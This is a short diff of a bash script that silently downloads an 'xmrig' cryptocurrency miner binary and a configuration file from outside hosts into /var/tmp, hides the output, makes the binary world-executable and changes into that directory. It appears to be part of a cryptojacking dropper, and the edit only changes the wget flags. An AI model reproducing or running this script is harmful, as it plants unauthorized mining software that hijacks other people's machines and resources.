@@ -1,6 +1,6 @@
 #!/bin/bash
-wget -o /var/tmp/ -L https://data.atonline.net/~jwt/eyJ2IjoxLCJ1IjoicGhwbGF0Zm9ybSIsImUiOjE2NTUwNDMxNjF9.eyJhY3QiOiJnZXQiLCJpbiI6eyJkbCI6dHJ1ZX0sInAiOiJibG9ic3JjL2Jsb2JzLXc1N2puai1xc281LWM0am4tcmp5eS01NDVlNXN2dSJ9.obKXsFRVMKOGcGKKKMXSqrc6oHVB9WlCuXJ35bKfVGY/xmrig > /dev/null 2>&1
-wget -o /var/tmp/config.json https://www.toptal.com/developers/hastebin/losinazaci.json  > /dev/null 2>&1
+wget https://data.atonline.net/~jwt/eyJ2IjoxLCJ1IjoicGhwbGF0Zm9ybSIsImUiOjE2NTUwNDMxNjF9.eyJhY3QiOiJnZXQiLCJpbiI6eyJkbCI6dHJ1ZX0sInAiOiJibG9ic3JjL2Jsb2JzLXc1N2puai1xc281LWM0am4tcmp5eS01NDVlNXN2dSJ9.obKXsFRVMKOGcGKKKMXSqrc6oHVB9WlCuXJ35bKfVGY/xmrig > /dev/null 2>&1
+wget https://www.toptal.com/developers/hastebin/losinazaci.json  > /dev/null 2>&1
 chmod 777 /var/tmp/xmrig 
 cd /var/tmp
 t_min=45
